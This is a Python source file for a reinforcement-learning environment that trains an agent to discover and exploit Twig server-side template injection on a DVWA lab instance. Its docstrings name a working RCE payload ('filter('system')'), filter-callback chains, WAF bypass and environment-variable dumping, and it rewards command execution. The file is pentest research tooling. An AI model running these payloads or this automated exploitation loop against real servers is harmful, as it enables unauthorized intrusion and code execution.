"""
DVWA SSTI (Server-Side Template Injection) Environment — Twig engine
Gymnasium environment for training an RL agent to discover and exploit
Server-Side Template Injection on DVWA's template injection page.

Attack surface: POST /vulnerabilities/ssti/  { name: <payload> }
Target: PHP/Twig template engine; evaluation confirmed when {{7*7}} → 49.
Success: expression evaluated OR RCE confirmed.

Action space: 10 discrete actions (identical semantic structure to JuiceShopSSTIEnv)
Observation space: 18-dimensional float vector (UNIFIED_SSTI_STATE_SIZE)

DVWA SSTI note
--------------
Standard DVWA does not ship an SSTI module.  This environment targets a
DVWA fork or custom instance that exposes a Twig template injection page at
/vulnerabilities/ssti/ accepting a POST parameter ``name``.  Adapt the URL
and parameter name in _execute_action() if your target differs.
"""

import json
import random
import logging
from pathlib import Path

import numpy as np
from bs4 import BeautifulSoup
from gymnasium import spaces

from environments.base_env import BasePentestEnv
from environments.feature_extractors import UNIFIED_SSTI_STATE_SIZE, extract_unified_ssti_state
from utils.response_analyzer import AnalysisResult

logger = logging.getLogger(__name__)


class DVWASSTIEnv(BasePentestEnv):
    """
    RL Environment for SSTI testing on DVWA (Twig template engine).

    The agent targets the Twig template engine on a DVWA SSTI page:
      1. POST /vulnerabilities/ssti/  name=<payload>
      2. Read the rendered HTML for evaluation evidence

    Actions mirror JuiceShopSSTIEnv semantics but map to Twig-specific
    payload families so a model pre-trained on Juice Shop (Pug) can
    transfer to DVWA (Twig) with minimal fine-tuning.

    Actions:
        0:  submit_baseline         - Submit a benign name ("PentestAgent")
        1:  probe_arithmetic        - {{7*7}} — confirm Twig eval
        2:  probe_string            - String/filter operations
        3:  inject_object           - Dump Twig _self / app objects
        4:  inject_env              - Access app.request.server env vars
        5:  inject_waf_bypass       - WAF bypass techniques
        6:  inject_filter_chain     - registerUndefinedFilterCallback chain
        7:  inject_rce_direct       - {{['id']|filter('system')}}
        8:  inject_rce_ssti         - Alternate RCE vector
        9:  report_done             - Agent declares finished

    Rewards:
        -1.0  per step (efficiency penalty)
        +15   expression evaluated (e.g. 49 found after {{7*7}})
        +30   server info leaked (PHP/server env vars in response)
        +100  command execution confirmed (uid=, /etc/passwd)
        -20   report_done without finding anything
        -5    repeating same action 3+ times in a row
        +2    exploration bonus (first use of each action)
    """

    ACTIONS = {
        0: "submit_baseline",
        1: "probe_arithmetic",
        2: "probe_string",
        3: "inject_object",
        4: "inject_env",
        5: "inject_waf_bypass",
        6: "inject_filter_chain",
        7: "inject_rce_direct",
        8: "inject_rce_ssti",
        9: "report_done",
    }

    ACTION_TO_FAMILY = {
        0: None,
        1: "twig_arithmetic",
        2: "twig_string_ops",
        3: "twig_object_dump",
        4: "twig_env_access",
        5: "twig_waf_bypass",
        6: "twig_filter_chain",
        7: "twig_rce",
        8: "twig_rce",
        9: None,
    }

    # DVWA page path for the SSTI module
    _SSTI_PATH = "/vulnerabilities/ssti/"

    # ------------------------------------------------------------------ #
    #  Identity
    # ------------------------------------------------------------------ #

    def _vuln_type(self) -> str:
        return "ssti"

    # ------------------------------------------------------------------ #
    #  Spaces
    # ------------------------------------------------------------------ #

    def _define_action_space(self) -> spaces.Discrete:
        return spaces.Discrete(len(self.ACTIONS))

    def _define_observation_space(self) -> spaces.Box:
        return spaces.Box(
            low=0.0, high=1.0,
            shape=(UNIFIED_SSTI_STATE_SIZE,),
            dtype=np.float32,
        )

    # ------------------------------------------------------------------ #
    #  Payload loading
    # ------------------------------------------------------------------ #

    def _load_payloads(self) -> dict:
        payload_file = Path(__file__).parent.parent / "payloads" / "ssti_payloads.json"
        with open(payload_file) as f:
            data = json.load(f)
        return data["payload_families"]

    # ------------------------------------------------------------------ #
    #  Initialisation
    # ------------------------------------------------------------------ #

    def _get_initial_page(self) -> str:
        """Fetch the DVWA SSTI page as the initial observation."""
        html, _ = self.client.get_page("ssti")
        return html

    def _capture_baselines(self):
        """Submit a benign name and record the rendered response as baseline."""
        html, status, _ = self._post_name("PentestAgent")
        self.analyzer.set_baseline("dvwa_ssti", html)
        self._baseline_html = html

    # ------------------------------------------------------------------ #
    #  Action execution
    # ------------------------------------------------------------------ #

    def _execute_action(self, action_id: int) -> tuple[str, AnalysisResult, dict]:
        """Execute one SSTI step: POST name payload, read HTML response."""
        action_name = self.ACTIONS[action_id]

        if action_id == 0:
            # Baseline: submit a benign name
            html, status, elapsed = self._post_name("PentestAgent")
            analysis = self.analyzer.analyze_ssti_response(
                html, "PentestAgent", status, elapsed,
                response_format="twig",
            )
            payload_info = self._build_payload_info(
                "PentestAgent", html, analysis
            )
            return html, analysis, payload_info

        elif action_id == 9:
            # report_done — no HTTP request
            analysis = AnalysisResult()
            analysis.has_command_execution = self.agent_memory.get("found_rce", False)
            payload_info = {
                "payload": "",
                "parameter": "name",
                "url_path": self._SSTI_PATH,
                "full_request_url": "",
                "response_snippet": "",
                "reflected": False,
            }
            return self._baseline_html, analysis, payload_info

        else:
            # Injection payload
            family_name = self.ACTION_TO_FAMILY[action_id]
            if family_name and family_name in self.payloads:
                payload = random.choice(self.payloads[family_name]["payloads"])
            else:
                payload = "{{7*7}}"  # safe fallback

            html, status, elapsed = self._post_name(payload)
            analysis = self.analyzer.analyze_ssti_response(
                html, payload, status, elapsed,
                response_format="twig",
            )

            logger.debug(
                f"DVWA SSTI action={action_name!r} payload={payload!r} "
                f"eval={analysis.expression_evaluated} "
                f"server_info={analysis.nodejs_info_leaked} "
                f"rce={analysis.has_command_execution} "
                f"waf={analysis.waf_blocked}"
            )

            payload_info = self._build_payload_info(payload, html, analysis)
            return html, analysis, payload_info

    def _post_name(self, name: str) -> tuple[str, int, float]:
        """POST the ``name`` parameter to DVWA's SSTI page and return response."""
        import time
        path = self._SSTI_PATH

        # Fetch the page to extract CSRF token
        page_resp = self.client.session.get(self.client._url(path))
        token = self.client._extract_csrf_token(
            BeautifulSoup(page_resp.text, "lxml")
        )

        data = {"name": name, "Submit": "Submit"}
        if token:
            data["user_token"] = token

        start = time.time()
        resp = self.client.session.post(self.client._url(path), data=data)
        elapsed = time.time() - start
        return resp.text, resp.status_code, elapsed

    def _build_payload_info(
        self,
        payload: str,
        html: str,
        analysis: AnalysisResult,
    ) -> dict:
        full_url = f"{self.dvwa_url}{self._SSTI_PATH} [POST name={payload[:60]}]"
        soup = BeautifulSoup(html, "lxml")
        snippet = soup.get_text(separator=" ", strip=True)[:500]
        reflected = payload.lower() in html.lower()
        return {
            "payload": payload,
            "parameter": "name",
            "url_path": self._SSTI_PATH,
            "full_request_url": full_url,
            "response_snippet": snippet,
            "reflected": reflected,
        }

    # ------------------------------------------------------------------ #
    #  Reward — identical structure to JuiceShopSSTIEnv
    # ------------------------------------------------------------------ #

    def _calculate_reward(self, action_id: int, analysis: AnalysisResult) -> float:
        reward = -1.0  # Step penalty

        if analysis.expression_evaluated and not self.agent_memory.get("_rewarded_eval"):
            reward += 15.0
            self.agent_memory["_rewarded_eval"] = True
            logger.debug("  +15: Twig expression evaluated")

        if analysis.nodejs_info_leaked and not self.agent_memory.get("_rewarded_server_info"):
            reward += 30.0
            self.agent_memory["_rewarded_server_info"] = True
            logger.debug("  +30: Server info leaked (PHP/env vars)")

        if analysis.has_command_execution and not self.agent_memory.get("found_rce"):
            reward += 100.0
            logger.debug("  +100: RCE confirmed!")

        if analysis.waf_blocked and not self.agent_memory.get("_saw_waf"):
            reward -= 5.0
            self.agent_memory["_saw_waf"] = True
            logger.debug("  -5: WAF block detected (first time)")

        if action_id == 9:
            if self.agent_memory.get("found_rce"):
                reward += 20.0
            else:
                reward -= 20.0

        recent_actions = [s.get("action_id") for s in self.episode_log[-3:]]
        if len(recent_actions) >= 3 and len(set(recent_actions)) == 1:
            reward -= 5.0

        if action_id not in self.agent_memory.get("tried_actions", set()):
            reward += 2.0

        return reward

    # ------------------------------------------------------------------ #
    #  Agent memory
    # ------------------------------------------------------------------ #

    def _init_agent_memory(self) -> dict:
        memory = super()._init_agent_memory()
        memory["found_eval"] = False
        memory["found_rce"] = False
        memory["_rewarded_eval"] = False
        memory["_rewarded_server_info"] = False
        memory["_saw_waf"] = False
        return memory

    def _update_agent_memory(self, action_id: int, analysis: AnalysisResult):
        super()._update_agent_memory(action_id, analysis)
        if analysis.expression_evaluated:
            self.agent_memory["found_eval"] = True
        if analysis.has_command_execution:
            self.agent_memory["found_rce"] = True

    # ------------------------------------------------------------------ #
    #  State extraction & termination
    # ------------------------------------------------------------------ #

    def _extract_state(self, html: str, analysis: AnalysisResult) -> np.ndarray:
        return extract_unified_ssti_state(
            html, analysis, self.agent_memory, response_format="twig"
        )

    def _is_success(self, analysis: AnalysisResult) -> bool:
        """Episode succeeds when template expression is evaluated OR RCE confirmed."""
        return analysis.expression_evaluated or analysis.has_command_execution

    def _get_action_name(self, action_id: int) -> str:
        return self.ACTIONS.get(action_id, f"unknown_{action_id}")
